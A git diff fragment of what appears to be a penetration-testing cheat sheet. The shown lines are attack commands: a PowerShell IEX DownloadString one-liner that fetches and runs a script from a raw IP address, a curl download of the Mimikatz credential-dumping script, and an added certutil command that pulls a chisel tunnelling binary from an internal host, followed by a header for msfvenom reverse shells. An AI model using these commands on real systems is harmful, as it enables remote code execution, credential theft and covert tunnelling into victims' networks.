@@ -183,6 +183,10 @@ IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/S
 ```
 curl https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
 ```
+##### POWERSHELL - DOWNLOAD CERTUTIL
+```
+certutil -urlcache -split -f http://10.11.7.210/chisel_1.7.7_windows_amd64
+```
 
 ## MSFVENOM
 ##### REVERSE SHELL - LINUX x64
